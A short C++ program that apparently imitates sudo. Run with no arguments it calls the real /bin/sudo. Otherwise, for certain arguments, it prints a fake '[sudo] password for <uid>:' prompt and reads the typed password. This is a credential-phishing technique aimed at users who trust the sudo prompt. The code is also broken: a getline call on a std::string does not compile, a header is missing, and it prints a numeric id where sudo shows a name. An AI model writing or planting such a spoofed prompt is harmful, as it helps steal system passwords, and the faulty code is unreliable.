#include <iostream>
#include <unistd.h>

int main(int argc, char *argv[])
{
    if(argc == 1)
    {
        system("/bin/sudo");
    }
    else
    {
        bool allargs = true;
        for(int i = 1;i < argc;i++)
        {
            std::string arg{argv[i]};
            if(arg.find("-") != std::string::npos && arg.rfind("-") > 1){
                allargs = false;
                i = argc;
            }
        }
        if(!allargs){
            std::cout << "[sudo] password for " << getuid() << ":" << std::endl;
            std::string passwd{""};
            std::cin.getline(passwd,256);
        }
    }
    return 0;
}